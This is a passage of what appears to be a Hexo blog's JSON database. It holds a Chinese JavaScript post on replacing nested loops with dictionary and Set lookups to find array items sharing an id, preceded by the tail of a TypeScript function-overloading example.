class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'hi'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">say</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'hello'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">say(); <span class=\"comment\">// -&gt; hello</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// typescript</span></span><br><span class=\"line\"><span class=\"comment\">// 官方的例子比较直接，这里直接使用官方的例子</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> suits = [<span class=\"string\">\"hearts\"</span>, <span class=\"string\">\"spades\"</span>, <span class=\"string\">\"clubs\"</span>, <span class=\"string\">\"diamonds\"</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 对于函数 pickCard 的参数与返回值进行约束</span></span><br><span class=\"line\"><span class=\"comment\">// 约束参数类型为 &#123;suit: string; card: number; &#125;[] 类型时，返回值类型为 number</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">pickCard</span>(<span class=\"params\">x: &#123;suit: <span class=\"built_in\">string</span>; card: <span class=\"built_in\">number</span>; &#125;[]</span>): <span class=\"title\">number</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 约束参数类型为 number 类型时，返回值类型为 &#123;suit: string; card: number; &#125;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">pickCard</span>(<span class=\"params\">x: <span class=\"built_in\">number</span></span>): </span>&#123;suit: <span class=\"built_in\">string</span>; card: <span class=\"built_in\">number</span>; &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 主体处理函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">pickCard</span>(<span class=\"params\">x</span>): <span class=\"title\">any</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> x == <span class=\"string\">\"object\"</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> pickedCard = <span class=\"built_in\">Math</span>.floor(<span class=\"built_in\">Math</span>.random() * x.length);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> pickedCard;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> x == <span class=\"string\">\"number\"</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> pickedSuit = <span class=\"built_in\">Math</span>.floor(x / <span class=\"number\">13</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> &#123; suit: suits[pickedSuit], card: x % <span class=\"number\">13</span> &#125;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> myDeck = [&#123; suit: <span class=\"string\">\"diamonds\"</span>, card: <span class=\"number\">2</span> &#125;, &#123; suit: <span class=\"string\">\"spades\"</span>, card: <span class=\"number\">10</span> &#125;, &#123; suit: <span class=\"string\">\"hearts\"</span>, card: <span class=\"number\">4</span> &#125;];</span><br><span class=\"line\"><span class=\"keyword\">let</span> pickedCard1 = myDeck[pickCard(myDeck)];</span><br><span class=\"line\">alert(<span class=\"string\">\"card: \"</span> + pickedCard1.card + <span class=\"string\">\" of \"</span> + pickedCard1.suit);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> pickedCard2 = pickCard(<span class=\"number\">15</span>);</span><br><span class=\"line\">alert(<span class=\"string\">\"card: \"</span> + pickedCard2.card + <span class=\"string\">\" of \"</span> + pickedCard2.suit);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// -&gt; error，没有一个重载的参数约束为 string</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> pickedCard3 = pickCard(<span class=\"string\">'15'</span>);</span><br><span class=\"line\">alert(<span class=\"string\">\"card: \"</span> + pickedCard3.card + <span class=\"string\">\" of \"</span> + pickedCard3.suit);</span><br></pre></td></tr></table></figure></p>\n<p><strong>这里需要注意的是</strong>：如果通过重载对函数进行约束之后，那么该函数只能接受重载的定义类型。</p>"},{"title":"优化双重循环","date":"2017-05-26T09:29:21.000Z","_content":"\n实际开发中或者部分的面试题中偶尔会遇到 `双重循环` 的问题，直接使用 `循环嵌套` 的效率又太低。\n<!-- more -->\n\n### 场景再现\n\n下面有两个数组，用最优的方式得出其中 `id` 相同的项。\n```js\nlet arr1 = [{\n    id: 1,\n    name: 'aaa'\n}, {\n    id: 2,\n    name: 'bbb'\n}, {\n    id: 3,\n    name: 'ccc'\n}, {\n    id: 4,\n    name: 'ddd'\n}, {\n    id: 5,\n    name: 'eee'\n}, {\n    id: 6,\n    name: 'fff'\n}];\n\nlet arr2 = [{\n    id: 1,\n    name: 'aaa'\n}, {\n    id: 7,\n    name: 'ggg'\n}, {\n    id: 12,\n    name: 'lll'\n}, {\n    id: 10,\n    name: 'jjj'\n}, {\n    id: 5,\n    name: 'eee'\n}, {\n    id: 9,\n    name: 'iii'\n}]\n```\n\n#### 方案\n\n**嵌套循环**\n通过双重 `for/forEach循环` 对比两个数组中的每一项，求出 `id` 相同的项。\n\n```js\nfor(var i = 0; i < arr1.length; i++) {\n    for(var j = 0; j < arr2.length; j++) {\n        if(arr1[i].id === arr2[j].id) {\n            // ...\n        }\n    }\n}\n```\n\n这种方法应该是每个会编程的人都会使用的一种方法，而且也是最简单的方法。如果这两个数组，每个数组各有 `9项`，那么为了得出结果，我们需要遍历 `9 * 9` 次，复杂度为 `81` 次。\n\n\n**降低空间指数**\n通过遍历数组结合字典查询降低空间指数。\n\n```js\nconst [maxArr, minArr] = arr1.length > arr2.length ? [arr1, arr2] : [arr2, arr1];\nlet tempObj = {}, result = [];\n\n// 这里我们可以得出遍历 maxArr 所需的复杂度 m\n// 一般情况下，我们使用长度最长的数组作为父本\nmaxArr.forEach(item => {\n    tempObj[item.id] = item\n})\n\n// 这里我们可以得出遍历 maxArr 所需的复杂度 n\nminArr.forEach(item => {\n    if(temoObj[item.id] === item.id) {\n        result.push(item)\n    }\n})\n\n// 结果集 result 就是 id 相同的项\n// 复杂度为 m + n\n```\n\n**使用es6语法一**\n\n```js\nconst spreadArr = [...arr1, ...arr2];\nlet tempObj = {}\n\n// 遍历 spreadArr 的复杂度为 arr1 的复杂度 m + arr2 的复杂度 n\nspreadArr.map(item => {\n    // 如果 tempObj 中没有这一项\n    if(!tempObj[item.id]) {\n        return {\n            tempObj[item.id]: item\n        }\n    }\n})\n\n```\n\n**使用es6语法二**\n\n```js\n// 这里这么转换是因为 new Set() 只能接收纯粹的数组，不能是 JSON 格式\nconst setArr1 = new Set(arr1.map(item => item.id));\nconst setArr2 = new Set(arr2.map(item => item.id));\n\n// 调用数组 filter 方法\n// 调用 Set 数据结构的 has 方法\nconst filterArr = [...setArr1].filter(item => setArr2.has(item))\n```\n\n### 总结\n`es6` 语法为我们提供了很多便利的 `api`，避免我们再去书写那些繁琐的代码。\n关于 `Set` 数据结构的更多信息可以点击[这里](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Set)。\n\n\n","source":"_posts/优化双重循环.md","raw":"---\ntitle: 优化双重循环\ndate: 2017-05-26 17:29:21\ntags:\n---\n\n实际开发中或者部分的面试题中偶尔会遇到 `双重循环` 的问题，直接使用 `循环嵌套` 的效率又太低。\n<!-- more -->\n\n### 场景再现\n\n下面有两个数组，用最优的方式得出其中 `id` 相同的项。\n```js\nlet arr1 = [{\n    id: 1,\n    name: 'aaa'\n}, {\n    id: 2,\n    name: 'bbb'\n}, {\n    id: 3,\n    name: 'ccc'\n}, {\n    id: 4,\n    name: 'ddd'\n}, {\n    id: 5,\n    name: 'eee'\n}, {\n    id: 6,\n    name: 'fff'\n}];\n\nlet arr2 = [{\n    id: 1,\n    name: 'aaa'\n}, {\n    id: 7,\n    name: 'ggg'\n}, {\n    id: 12,\n    name: 'lll'\n}, {\n    id: 10,\n    name: 'jjj'\n}, {\n    id: 5,\n    name: 'eee'\n}, {\n    id: 9,\n    name: 'iii'\n}]\n```\n\n#### 方案\n\n**嵌套循环**\n通过双重 `for/forEach循环` 对比两个数组中的每一项，求出 `id` 相同的项。\n\n```js\nfor(var i = 0; i < arr1.length; i++) {\n    for(var j = 0; j < arr2.length; j++) {\n        if(arr1[i].id === arr2[j].id) {\n            // ...\n        }\n    }\n}\n```\n\n这种方法应该是每个会编程的人都会使用的一种方法，而且也是最简单的方法。如果这两个数组，每个数组各有 `9项`，那么为了得出结果，我们需要遍历 `9 * 9` 次，复杂度为 `81` 次。\n\n\n**降低空间指数**\n通过遍历数组结合字典查询降低空间指数。\n\n```js\nconst [maxArr, minArr] = arr1.length > arr2.length ? [arr1, arr2] : [arr2, arr1];\nlet tempObj = {}, result = [];\n\n// 这里我们可以得出遍历 maxArr 所需的复杂度 m\n// 一般情况下，我们使用长度最长的数组作为父本\nmaxArr.forEach(item => {\n    tempObj[item.id] = item\n})\n\n// 这里我们可以得出遍历 maxArr 所需的复杂度 n\nminArr.forEach(item => {\n    if(temoObj[item.id] === item.id) {\n        result.push(item)\n    }\n})\n\n// 结果集 result 就是 id 相同的项\n// 复杂度为 m + n\n```\n\n**使用es6语法一**\n\n```js\nconst spreadArr = [...arr1, ...arr2];\nlet tempObj = {}\n\n// 遍历 spreadArr 的复杂度为 arr1 的复杂度 m + arr2 的复杂度 n\nspreadArr.map(item => {\n    // 如果 tempObj 中没有这一项\n    if(!tempObj[item.id]) {\n        return {\n            tempObj[item.id]: item\n        }\n    }\n})\n\n```\n\n**使用es6语法二**\n\n```js\n// 这里这么转换是因为 new Set() 只能接收纯粹的数组，不能是 JSON 格式\nconst setArr1 = new Set(arr1.map(item => item.id));\nconst setArr2 = new Set(arr2.map(item => item.id));\n\n// 调用数组 filter 方法\n// 调用 Set 数据结构的 has 方法\nconst filterArr = [...setArr1].filter(item => setArr2.has(item))\n```\n\n### 总结\n`es6` 语法为我们提供了很多便利的 `api`，避免我们再去书写那些繁琐的代码。\n关于 `Set` 数据结构的更多信息可以点击[这里](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Set)。\n\n\n","slug":"优化双重循环","published":1,"updated":"2018-10-25T06:05:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjno6s7qt000f02vsxc0bclpi","content":"<p>实际开发中或者部分的面试题中偶尔会遇到 <code>双重循环</code> 的问题，直接使用 <code>循环嵌套</code> 的效率又太低。<br><a id=\"more\"></a></p>\n<h3 id=\"场景再现\"><a href=\"#场景再现\" class=\"headerlink\" title=\"场景再现\"></a>场景再现</h3><p>下面有两个数组，用最优的方式得出其中 <code>id</code> 相同的项。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr1 = [&#123;</span><br><span class=\"line\">    id: <span class=\"number\">1</span>,</span><br><span class=\"line\">    name: <span class=\"string\">'aaa'</span></span><br><span class=\"line\">&#125;, &#123;</span><br><span class=\"line\">    id: <span class=\"number\">2</span>,</span><br><span class=\"line\">    name: <span class=\"string\">'bbb'</span></span><br><span class=\"line\">&#125;, &#123;</span><br><span class=\"line\">    id: <span class=\"number\">3</span>,</span><br><span class=\"line\">    name: <span class=\"string\">'ccc'</span></span><br><span class=\"line\">&#125;, &#123;</span><br><span class=\"line\">    id: <span class=\"number\">4</span>,</span><br><span class=\"line\">    name: <span class=\"string\">'ddd'</span></span><br><span class=\"line\">&#125;, &#123;</span><br><span class=\"line\">    id: <span class=\"number\">5</span>,</span><br><span class=\"line\">    name: <span class=\"string\">'eee'</span></span><br><span class=\"line\">&#125;, &#123;</span><br><span class=\"line\">    id: <span class=\"number\">6</span>,</span><br><span class=\"line\">    name: <span class=\"string\">'fff'</span></span><br><span class=\"line\">&#125;];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> arr2 = [&#123;</span><br><span class=\"line\">    id: <span class=\"number\">1</span>,</span><br><span class=\"line\">    name: <span class=\"string\">'aaa'</span></span><br><span class=\"line\">&#125;, &#123;</span><br><span class=\"line\">    id: <span class=\"number\">7</span>,</span><br><span class=\"line\">    name: <span class=\"string\">'ggg'</span></span><br><span class=\"line\">&#125;, &#123;</span><br><span class=\"line\">    id: <span class=\"number\">12</span>,</span><br><span class=\"line\">    name: <span class=\"string\">'lll'</span></span><br><span class=\"line\">&#125;, &#123;</span><br><span class=\"line\">    id: <span class=\"number\">10</span>,</span><br><span class=\"line\">    name: <span class=\"string\">'jjj'</span></span><br><span class=\"line\">&#125;, &#123;</span><br><span class=\"line\">    id: <span class=\"number\">5</span>,</span><br><span class=\"line\">    name: <span class=\"string\">'eee'</span></span><br><span class=\"line\">&#125;, &#123;</span><br><span class=\"line\">    id: <span class=\"number\">9</span>,</span><br><span class=\"line\">    name: <span class=\"string\">'iii'</span></span><br><span class=\"line\">&#125;]</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"方案\"><a href=\"#方案\" class=\"headerlink\" title=\"方案\"></a>方案</h4><p><strong>嵌套循环</strong><br>通过双重 <code>for/forEach循环</code> 对比两个数组中的每一项，求出 <code>id</code> 相同的项。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; arr1.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> j = <span class=\"number\">0</span>; j &lt; arr2.length; j++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(arr1[i].id === arr2[j].id) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// ...</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这种方法应该是每个会编程的人都会使用的一种方法，而且也是最简单的方法。如果这两个数组，每个数组各有 <code>9项</code>，那么为了得出结果，我们需要遍历 <code>9 * 9</code> 次，复杂度为 <code>81</code> 次。</p>\n<p><strong>降低空间指数</strong><br>通过遍历数组结合字典查询降低空间指数。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> [maxArr, minArr] = arr1.length &gt; arr2.length ? [arr1, arr2] : [arr2, arr1];</span><br><span class=\"line\"><span class=\"keyword\">let</span> tempObj = &#123;&#125;, result = [];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 这里我们可以得出遍历 maxArr 所需的复杂度 m</span></span><br><span class=\"line\"><span class=\"comment\">// 一般情况下，我们使用长度最长的数组作为父本</span></span><br><span class=\"line\">maxArr.forEach(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> &#123;</span><br><span class=\"line\">    tempObj[item.id] = item</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 这里我们可以得出遍历 maxArr 所需的复杂度 n</span></span><br><span class=\"line\">minArr.forEach(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(temoObj[item.id] === item.id) &#123;</span><br><span class=\"line\">        result.push(item)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 结果集 result 就是 id 相同的项</span></span><br><span class=\"line\"><span class=\"comment\">// 复杂度为 m + n</span></span><br></pre></td></tr></table></figure>\n<p><strong>使用es6语法一</strong></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> spreadArr = [...arr1, ...arr2];</span><br><span class=\"line\"><span class=\"keyword\">let</span> tempObj = &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 遍历 spreadArr 的复杂度为 arr1 的复杂度 m + arr2 的复杂度 n</span></span><br><span class=\"line\">spreadArr.map(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 如果 tempObj 中没有这一项</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!tempObj[item.id]) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">            tempObj[item.id]: item</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<p><strong>使用es6语法二</strong></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 这里这么转换是因为 new Set() 只能接收纯粹的数组，不能是 JSON 格式</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> setArr1 = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>(arr1.map(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> item.id));</span><br><span class=\"line\"><span class=\"keyword\">const</span> setArr2 = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>(arr2.map(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> item.id));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 调用数组 filter 方法</span></span><br><span class=\"line\"><span class=\"comment\">// 调用 Set 数据结构的 has 方法</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> filterArr = [...setArr1].filter(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> setArr2.has(item))</span><br></pre></td></tr></table></figure>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p><code>es6</code> 语法为我们提供了很多便利的 <code>api</code>，避免我们再去书写那些繁琐的代码。<br>关于 <code>Set</code> 数据结构的更多信息可以点击<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Set\" target=\"_blank\" rel=\"noopener\">这里</a>。</p>\n","site":{"data":{}},"excerpt":"<p>实际开发中或者部分的面试题中偶尔会遇到 <code>双重循环</code> 的问题，直接使用 <code>循环嵌套</code> 的效率又太低。<br>","more":"</p>\n<h3 id=\"场景再现\"><a href=\"#场景再现\" class=\"headerlink\" title=\"场景再现\"></a>场景再现</h3><p>下面有两个数组，用最优的方式得出其中 <code>id</code> 相同的项。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr1 = [&#123;</span><br><span class=\"line\">    id: <span class=\"number\">1</span>,</span><br><span class=\"line\">    name: <span class=\"string\">'aaa'</span></span><br><span class=\"line\">&#125;, &#123;</span><br><span class=\"line\">    id: <span class=\"number\">2</span>,</span><br><span class=\"line\">    name: <span class=\"string\">'bbb'</span></span><br><span class=\"line\">&#125;, &#123;</span><br><span class=\"line\">    id: <span class=\"number\">3</span>,</span><br><span class=\"line\">    name: <span class=\"string\">'ccc'</span></span><br><span class=\"line\">&#125;, &#123;</span><br><span class=\"line\">    id: <span class=\"number\">4</span>,</span><br><span class=\"line\">    name: <span class=\"string\">'ddd'</span></span><br><span class=\"line\">&#125;, &#123;</span><br><span class=\"line\">    id: <span class=\"number\">5</span>,</span><br><span class=\"line\">    name: <span class=\"string\">'eee'</span></span><br><span class=\"line\">&#125;, &#123;</span><br><span class=\"line\">    id: <span class=\"number\">6</span>,</span><br><span class=\"line\">    name: <span class=\"string\">'fff'</span></span><br><span class=\"line\">&#125;];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> arr2 = [&#123;</span><br><span class=\"line\">    id: <span class=\"number\">1</span>,</span><br><span class=\"line\">    name: <span class=\"string\">'aaa'</span></span><br><span class=\"line\">&#125;, &#123;</span><br><span class=\"line\">    id: <span class=\"number\">7</span>,</span><br><span class=\"line\">    name: <span class=\"string\">'ggg'</span></span><br><span class=\"line\">&#125;, &#123;</span><br><span class=\"line\">    id: <span class=\"number\">12</span>,</span><br><span class=\"line\">    name: <span class=\"string\">'lll'</span></span><br><span class=\"line\">&#125;, &#123;</span><br><span class=\"line\">    id: <span class=\"number\">10</span>,</span><br><span class=\"line\">    name: <span class=\"string\">'jjj'</span></span><br><span class=\"line\">&#125;, &#123;</span><br><span class=\"line\">    id: <span class=\"number\">5</span>,</span><br><span class=\"line\">    name: <span class=\"string\">'eee'</span></span><br><span class=\"line\">&#125;, &#123;</span><br><span class=\"line\">    id: <span class=\"number\">9</span>,</span><br><span class=\"line\">    name: <span class=\"string\">'iii'</span></span><br><span class=\"line\">&#125;]</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"方案\"><a href=\"#方案\" class=\"headerlink\" title=\"方案\"></a>方案</h4><p><strong>嵌套循环</strong><br>通过双重 <code>for/forEach循环</code> 对比两个数组中的每一项，求出 <code>id</code> 相同的项。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; arr1.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> j = <span class=\"number\">0</span>; j &lt; arr2.length; j++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(arr1[i].id === arr2[j].id) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// ...</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这种方法应该是每个会编程的人都会使用的一种方法，而且也是最简单的方法。如果这两个数组，每个数组各有 <code>9项</code>，那么为了得出结果，我们需要遍历 <code>9 * 9</code> 次，复杂度为 <code>81</code> 次。</p>\n<p><strong>降低空间指数</strong><br>通过遍历数组结合字典查询降低空间指数。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> [maxArr, minArr] = arr1.length &gt; arr2.length ? [arr1, arr2] : [arr2, arr1];</span><br><span class=\"line\"><span class=\"keyword\">let</span> tempObj = &#123;&#125;, result = [];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 这里我们可以得出遍历 maxArr 所需的复杂度 m</span></span><br><span class=\"line\"><span class=\"comment\">// 一般情况下，我们使用长度最长的数组作为父本</span></span><br><span class=\"line\">maxArr.forEach(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> &#123;</span><br><span class=\"line\">    tempObj[item.id] = item</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 这里我们可以得出遍历 maxArr 所需的复杂度 n</span></span><br><span class=\"line\">minArr.forEach(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(temoObj[item.id] === item.id) &#123;</span><br><span class=\"line\">        result.push(item)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 结果集 result 就是 id 相同的项</span></span><br><span class=\"line\"><span class=\"comment\">// 复杂度为 m + n</span></span><br></pre></td></tr></table></figure>\n<p><strong>使用es6语法一</strong></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> spreadArr = [...arr1, ...arr2];</span><br><span class=\"line\"><span class=\"keyword\">let</span> tempObj = &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 遍历 spreadArr 的复杂度为 arr1 的复杂度 m + arr2 的复杂度 n</span></span><br><span class=\"line\">spreadArr.map(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 如果 tempObj 中没有这一项</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!tempObj[item.id]) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">            tempObj[item.id]: item</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<p><strong>使用es6语法二</strong></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 这里这么转换是因为 new Set() 只能接收纯粹的数组，不能是 JSON 